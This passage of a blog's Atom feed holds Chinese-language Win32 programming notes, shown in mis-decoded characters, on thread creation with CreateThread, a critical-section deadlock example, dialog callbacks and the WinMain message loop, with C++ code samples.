class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">DWORD dwIndex = <span class="number">0</span>;</span><br><span class="line">DWORD dwCount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (dwIndex &lt; <span class="number">1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;cs2);<span class="comment">//é”2</span></span><br><span class="line">***********å®¹æ˜“äº§ç”Ÿæ­»é”çš„ä½ç½®***********</span><br><span class="line">EnterCriticalSection(&amp;cs1);<span class="comment">//é”1</span></span><br><span class="line"></span><br><span class="line">GetWindowText(hEDIT, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwCount);</span><br><span class="line">dwCount++;</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(szBuffer, <span class="string">&quot;%d&quot;</span>, dwCount);</span><br><span class="line">SetWindowText(hEDIT, szBuffer);</span><br><span class="line">dwIndex++;</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs1);</span><br><span class="line"></span><br><span class="line">LeaveCriticalSection(&amp;cs2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜&quot;&gt;&lt;a href=&quot;#å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜&quot;&gt;&lt;/a&gt;å¤šçº¿ç¨‹ä¹‹é—´çš„èµ„æºæŠ¢å é—®é¢˜&lt;/h3&gt;&lt;p&gt;â€‹        å½“å¤š</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="çº¿ç¨‹" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ¦Win32å­¦ä¹ è®°å½•-2(åˆ›å»ºçº¿ç¨‹)</title>
    <link href="http://example.com/2020/11/02/windows/Win32-2/"/>
    <id>http://example.com/2020/11/02/windows/Win32-2/</id>
    <published>2020-11-02T15:05:23.683Z</published>
    <updated>2021-02-05T06:29:33.979Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>âœˆâœˆå›¾å½¢åŒ–ç•Œé¢åˆ›å»ºè¿‡ç¨‹ç•¥è¿‡âœˆâœˆ</p><h3 id="CreateThreadå‡½æ•°ä»‹ç»"><a href="#CreateThreadå‡½æ•°ä»‹ç»" class="headerlink" title="CreateThreadå‡½æ•°ä»‹ç»"></a>CreateThreadå‡½æ•°ä»‹ç»</h3><ul><li><p>MSDNå¯¹CreateThreadçš„è§£é‡Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>ä¸­æ–‡ç‰ˆ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// å®‰å…¨å±æ€§ é€šå¸¸ä¸ºNULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwStackSize,                       <span class="comment">// å‚æ•°ç”¨äºè®¾å®šçº¿ç¨‹å¯ä»¥å°†å¤šå°‘åœ°å€ç©ºé—´ç”¨äºå®ƒè‡ªå·±çš„å †æ ˆ</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// æ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰å®ƒè‡ªå·±çš„å †æ ˆ</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// å‚æ•°ç”¨äºæŒ‡æ˜æƒ³è¦æ–°çº¿ç¨‹æ‰§è¡Œçš„çº¿ç¨‹å‡½æ•°çš„åœ°å€</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpParameter,                       <span class="comment">// çº¿ç¨‹å‡½æ•°çš„å‚æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// åœ¨çº¿ç¨‹å¯åŠ¨æ‰§è¡Œæ—¶å°†è¯¥å‚æ•°ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="comment">// æ—¢å¯ä»¥æ˜¯æ•°å­—ï¼Œä¹Ÿå¯ä»¥æ˜¯æŒ‡å‘åŒ…å«å…¶ä»–ä¿¡æ¯çš„ä¸€ä¸ªæ•°æ®ç»“æ„çš„æŒ‡é’ˆ</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCreationFlags,                    <span class="comment">// 0 åˆ›å»ºå®Œæ¯•ç«‹å³è°ƒåº¦  CREATE_SUSPENDEDåˆ›å»ºåæŒ‚èµ·</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpThreadId                        <span class="comment">// çº¿ç¨‹ID </span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">// è¿”å›å€¼ï¼šçº¿ç¨‹å¥æŸ„</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="ç•Œé¢èµ„æºä»‹ç»"><a href="#ç•Œé¢èµ„æºä»‹ç»" class="headerlink" title="ç•Œé¢èµ„æºä»‹ç»"></a>ç•Œé¢èµ„æºä»‹ç»</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201102222253640.png"></p><h3 id="WinMainå‡½æ•°"><a href="#WinMainå‡½æ•°" class="headerlink" title="WinMainå‡½æ•°"></a>WinMainå‡½æ•°</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> nCmdShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), <span class="literal">NULL</span>, DiaLogProc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰"><a href="#DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰" class="headerlink" title="DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰"></a>DiaLogProcå‡½æ•°ï¼ˆæ¶ˆæ¯å›è°ƒå‡½æ•°ï¼‰</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">DiaLogProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND hwndDlg,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT uMsg,</span></span></span><br><span class="line"><span class="function"><span class="params">WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">&#123;</span><br><span class="line">            ********************************è·å¾—ä¸¤ä¸ªçª—å£å¥æŸ„***************************</span><br><span class="line">hEDIT_ONE = GetDlgItem(hwndDlg, IDC_EDIT_ONE);</span><br><span class="line">hEDIT_TWO = GetDlgItem(hwndDlg, IDC_EDIT_TWO);</span><br><span class="line">            ************************************************************************</span><br><span class="line">            </span><br><span class="line">            ********************************åˆå§‹åŒ–çª—å£********************************</span><br><span class="line">SetWindowText(hEDIT_ONE, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">SetWindowText(hEDIT_TWO, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">            ************************************************************************</span><br><span class="line">                </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDC_BUTTON:</span><br><span class="line">&#123;</span><br><span class="line">                    </span><br><span class="line">                    *****************************åˆ›å»ºäº†ä¸¤ä¸ªçº¿ç¨‹*****************************</span><br><span class="line">HANDLE hThread1 = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE hThread2 = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">                    **********************************************************************</span><br><span class="line">                        </span><br><span class="line">::CloseHandle(hThread1);</span><br><span class="line">::CloseHandle(hThread2);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line">DestroyWindow(hwndDlg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwndDlg, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çº¿ç¨‹å‡½æ•°1"><a href="#çº¿ç¨‹å‡½æ•°1" class="headerlink" title="çº¿ç¨‹å‡½æ•°1"></a>çº¿ç¨‹å‡½æ•°1</h3><p><strong>æ³¨æ„è¿™é‡Œç›´æ¥å°†è¿”å›å€¼(çº¿ç¨‹å¥æŸ„)è®¾ç½®ä¸º0</strong>ï¼Œå¦å¤–ä¸€ä¸ªçº¿ç¨‹å‡½æ•°ä¸è¿™ä¸ªç›¸ä¼¼ï¼Œä¸åœ¨è´´å‡ºæ¥ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//å°†æ–‡æœ¬æ¡†ä¸­çš„è¾“å…¥ä¼ å…¥Bufferä¸­</span></span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">GetWindowText(hEDIT_ONE, szBuffer, <span class="number">10</span>);</span><br><span class="line"><span class="comment">//å°†Bufferä¸­çš„å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—</span></span><br><span class="line">DWORD dwTimer;</span><br><span class="line"><span class="keyword">int</span> check = <span class="built_in">sscanf</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)szBuffer, <span class="string">&quot;%d&quot;</span>, &amp;dwTimer);</span><br><span class="line"><span class="keyword">while</span> (dwTimer &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Sleep(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//åœ¨å°†æ•°å­—å‡1åå˜ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>((<span class="keyword">char</span>*)szBuffer, <span class="string">&quot;%d&quot;</span>, --dwTimer);</span><br><span class="line"><span class="comment">//å°†å­—ç¬¦ä¸²æ”¾å›åˆ°æ–‡æœ¬æ¡†ä¸­</span></span><br><span class="line">SetWindowText(hEDIT_ONE, szBuffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201102230457022.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;âœˆâœˆå›¾å½¢åŒ–ç•Œé¢åˆ›å»ºè¿‡ç¨‹ç•¥è¿‡âœˆâœˆ&lt;/p&gt;
&lt;h3 id=&quot;CreateThreadå‡½æ•°ä»‹ç»&quot;&gt;&lt;a href=&quot;#CreateThreadå‡½æ•°ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;CreateThreadå‡½æ•°ä»‹ç»&quot;&gt;</summary>
      
    
    
    
    <category term="Windows" scheme="http://example.com/categories/Windows/"/>
    
    <category term="win32" scheme="http://example.com/categories/Windows/win32/"/>
    
    <category term="çº¿ç¨‹" scheme="http://example.com/categories/Windows/win32/%E7%BA%BF%E7%A8%8B/"/>
    
    
    <category term="ç¼–ç¨‹" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ¦Win32å­¦ä¹ è®°å½•(æ³¨å†Œ-åˆ›å»ºçª—å£)-1</title>
    <link href="http://example.com/2020/10/29/windows/Win32-1/"/>
    <id>http://example.com/2020/10/29/windows/Win32-1/</id>
    <published>2020-10-29T15:59:34.213Z</published>
    <updated>2021-02-05T06:29:17.184Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°-WinMain"><a href="#WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°-WinMain" class="headerlink" title="WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°:WinMain()"></a>WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°:WinMain()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSTR lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCmdShow</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åœ¨Windowsä¸‹ç¼–å†™çš„ç¨‹åºå…¥å£ï¼Œä¸‹é¢å¯¹å‚æ•°é€ä¸ªè§£é‡Š</p><h4 id="hInstance"><a href="#hInstance" class="headerlink" title="hInstance"></a>hInstance</h4><ul><li>hInstanceæ˜¯åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚è¿™é‡Œçš„å®ä¾‹å¥æŸ„æ˜¯ç¨‹åºè£…å…¥å†…å­˜åçš„èµ·å§‹åœ°å€ã€‚</li><li>é€šè¿‡GetModuleHandle() å‚æ•°æ¥è·å¾—ã€‚</li></ul><h4 id="hPrevInstance"><a href="#hPrevInstance" class="headerlink" title="hPrevInstance"></a>hPrevInstance</h4><ul><li>åŒä¸€ä¸ªæ–‡ä»¶åˆ›å»ºçš„ä¸Šä¸€ä¸ªå®ä¾‹å¥æŸ„ã€‚è¿™ä¸ªå‚æ•°åœ¨Win32ä¸‹å·²ç»ä¸å†ä½¿ç”¨ã€‚</li></ul><h4 id="lpCmdLine"><a href="#lpCmdLine" class="headerlink" title="lpCmdLine"></a>lpCmdLine</h4><ul><li><p>ä¸»å‡½æ•°çš„å‚æ•°ï¼Œç”¨äºåœ¨ç¨‹åºå¯åŠ¨æ—¶ç»™è¿›ç¨‹ä¼ é€’å‚æ•°</p><p>ç‚¹å‡»å¼€å§‹ï¼Œæ‰“å¼€è¿è¡Œçª—å£ï¼Œè¾“å…¥â€notepad C:\boot.iniâ€ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨ä¸ºå°†å­˜å‚¨åœ¨Cç›˜ç›®å½•ä¸‹çš„book.iniæ–‡ä»¶ç”¨è®°äº‹æœ¬æ–¹å¼æ‰“å¼€ï¼Œç‚¹å‡»ç¡®å®šï¼Œè®°äº‹æœ¬å¼¹å‡ºï¼Œç”±äºæˆ‘çš„Cç›˜ç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201029213610750.png" alt="" style="zoom: 67%;" />     <img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20201029213702148.png" alt="" style="zoom:50%;" />   </p></li></ul><h4 id="nCmdShow"><a href="#nCmdShow" class="headerlink" title="nCmdShow"></a>nCmdShow</h4><ul><li>è¡¨ç¤ºè¿›ç¨‹æ˜¾ç¤ºæ–¹å¼ï¼Œå¯ä»¥ä¸ºæœ€å¤§åŒ–ï¼Œæœ€å°åŒ–ï¼Œéšè—ç­‰æ˜¾ç¤ºæ–¹å¼ã€‚</li></ul><h3 id="WinMainä¸­å‡½æ•°æµç¨‹"><a href="#WinMainä¸­å‡½æ•°æµç¨‹" class="headerlink" title="WinMainä¸­å‡½æ•°æµç¨‹"></a>WinMainä¸­å‡½æ•°æµç¨‹</h3><h4 id="æ³¨å†Œçª—å£ç±»"><a href="#æ³¨å†Œçª—å£ç±»" class="headerlink" title="æ³¨å†Œçª—å£ç±»"></a>æ³¨å†Œçª—å£ç±»</h4><p>ç¼–å†™Windowsç¨‹åºï¼ŒWinMain()å‡½æ•°çš„ä¸»è¦ä»»åŠ¡æ˜¯æ³¨å†Œä¸€ä¸ªçª—å£ç±»ï¼Œåˆ›å»ºä¸€ä¸ªçª—å£å¹¶æ˜¾ç¤ºåˆ›å»ºçš„çª—å£ï¼Œåœ¨ä¸åœçš„è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶åˆ†å‘ç»™è‡ªå·±çš„çª—å£ã€‚çŸ¥é“æ¥å—åˆ°WM_QUITæ¶ˆæ¯åé€€å‡ºå¾ªç¯ç»“æŸè¿›ç¨‹ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">                     HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">                     LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="comment">// <span class="doctag">TODO:</span> Place code here.</span></span><br><span class="line">MSG Msg;</span><br><span class="line">BOOL bRet;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨å†Œçª—å£ç±»</span></span><br><span class="line">MyRegisterClass(hInstance);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºçª—å£å¹¶æ˜¾ç¤ºçª—å£</span></span><br><span class="line"><span class="keyword">if</span>(!InitInstance(hInstance, SW_SHOWNORMAL))</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¶ˆæ¯å¾ªç¯</span></span><br><span class="line"><span class="comment">//è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶è¿›è¡Œåˆ†å‘</span></span><br><span class="line"><span class="keyword">while</span>( (bRet = GetMessage(&amp;Msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(bRet == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//handle the error and possibly exit</span></span><br><span class="line"><span class="comment">//å¥æŸ„é”™è¯¯å¼ºåˆ¶é€€å‡º</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;Msg);</span><br><span class="line">DispatchMessage(&amp;Msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å¯¹éƒ¨åˆ†å‡½æ•°çš„ä½œç”¨è¿›è¡Œè§£é‡Š</p><h5 id="GetMessage"><a href="#GetMessage" class="headerlink" title="GetMessage"></a>GetMessage</h5><p>MSDNå¯¹äºè¯¥å‡½æ•°å‚æ•°çš„è§£é‡Š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPMSG lpMsg,         <span class="comment">// message information</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWnd,           <span class="comment">// handle to window</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMin,  <span class="comment">// first message</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMax   <span class="comment">// last message</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ç”¨æ¥è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯ï¼Œå¹¶å¡«å……MSGç»“æ„ä½“</p><h5 id="TranslateMessage"><a href="#TranslateMessage" class="headerlink" title="TranslateMessage"></a>TranslateMessage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">TranslateMessage</span><span class="params">(  CONST MSG *lpMsg   <span class="comment">// message information);</span></span></span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ç”¨äºå¤„ç†é”®ç›˜æ¶ˆæ¯ã€‚å°†è™šæ‹Ÿç æ¶ˆæ¯è½¬æ¢ä¸ºå­—ç¬¦æ¶ˆæ¯</p><h5 id="DispatchMessage"><a href="#DispatchMessage" class="headerlink" title="DispatchMessage"></a>DispatchMessage</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">DispatchMessage</span><span class="params">(  CONST MSG *lpmsg   <span class="comment">// message information);</span></span></span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä½œç”¨ä¸ºå°†æ¶ˆæ¯åˆ†å‘ç»™çª—å£</p><h3 id="æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°"><a href="#æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°"></a>æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°</h3><p>åœ¨WinMain()å‡½æ•°ä¸­ï¼Œé¦–å…ˆè°ƒç”¨çš„æ˜¯<strong>MyRegisterClass</strong>å‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œéœ€è¦ä¼ 